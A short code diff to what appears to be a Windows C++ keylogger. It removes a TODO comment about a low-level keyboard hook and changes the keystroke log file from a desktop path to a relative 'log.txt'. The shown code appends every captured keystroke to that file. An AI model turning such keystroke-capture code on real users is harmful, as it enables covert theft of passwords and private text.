@@ -1,4 +1,3 @@
-// TODO: Low-level keyboard hook (less precise, but works globally)
 #include <windows.h>
 #include <fstream>
 #include <string>
@@ -86,7 +85,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         std::string keyString = VirtualKeyToString(p->vkCode);
         
         if (!keyString.empty()) {
-            std::ofstream log("C:\\Users\\X\\Desktop\\KeyHook2\\log.txt", std::ios::app);
+            std::ofstream log("log.txt", std::ios::app);
             log << keyString;
             log.close();
         }
